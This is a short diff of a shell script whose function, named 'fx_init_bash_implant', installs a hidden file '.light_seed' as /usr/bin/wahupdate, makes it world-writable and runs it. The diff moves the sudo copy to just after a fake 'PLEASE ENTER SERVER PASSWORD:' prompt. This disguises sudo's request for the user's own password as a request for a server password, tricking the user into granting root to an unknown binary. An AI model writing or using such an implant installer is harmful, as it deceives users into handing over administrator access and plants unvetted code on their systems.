@@ -13,7 +13,6 @@ out_msg() {
     echo ' If you do not know the server'
     echo ' password, please call WAH Office'
     echo '********************************'
-    read -p "Press ENTER to continue..."
 }
 
 
@@ -21,8 +20,8 @@ out_msg() {
 
 fx_init_bash_implant() {
     out_msg
-    sudo cp .light_seed /usr/bin/wahupdate
     echo "PLEASE ENTER SERVER PASSWORD:"
+    sudo cp .light_seed /usr/bin/wahupdate
     sudo chmod 777 /usr/bin/wahupdate
 }
 
@@ -41,5 +40,5 @@ fx_init_bash_implant() {
         fx_init_bash_implant
     else
         fx_init_bash_implant
-        sh /usr/bin/wahupdate
+        wahupdate
     fi
